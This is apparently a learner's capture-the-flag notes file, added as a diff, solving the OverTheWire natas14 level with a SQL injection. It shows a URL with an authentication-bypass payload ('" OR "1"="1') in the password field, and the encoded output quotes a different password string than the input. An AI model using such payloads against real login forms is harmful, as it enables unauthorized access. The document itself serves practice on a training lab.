@@ -1,0 +1,11 @@
+
+	# It's a simple SQL injection code. I've never did that before, so it's my first hehe
+	# Realized that it accepts GET requests and it has a parameter called debug to print the query, so I used that to help me.
+
+	# Using Chrome's console to escape the queryparams of the get request made it so easy.
+	encodeURI('http://natas14.natas.labs.overthewire.org/index.php?debug=1&username=joao&password=<inject_here>');
+
+	# Final code:
+	encodeURI('http://natas14.natas.labs.overthewire.org/index.php?debug=1&username=joao&password=whatever" OR "1"="1');
+	-> "http://natas14.natas.labs.overthewire.org/index.php?debug=1&username=joao&password=teucu%22%20OR%20%221%22=%221"
+	-> username = joao         password = whatever OR "1"="1
